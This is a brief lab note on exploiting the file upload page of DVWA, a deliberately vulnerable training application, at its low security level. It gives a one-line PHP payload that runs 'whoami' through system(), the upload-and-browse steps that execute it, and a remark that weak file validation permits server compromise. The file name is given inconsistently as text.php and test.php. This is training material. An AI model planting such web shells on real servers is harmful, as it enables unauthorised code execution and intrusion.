# DVWA - File Upload RCE (Low)

**Target:** File Upload Page
**Sec Level:** Low

**Payload:** text.php
```php  
  <?php echo "Hi there~ !"; system('whoami'); ?>  
```
    
## Steps taken:
1. Set sec to low
2. Upload test.php
3. Access the file via /dvwa/hackable/uploads/test.php
4. Successful code exe

## Final notes
improper file validation can lead to remote code execution - in specific environments, this can be exploited for full server compromise
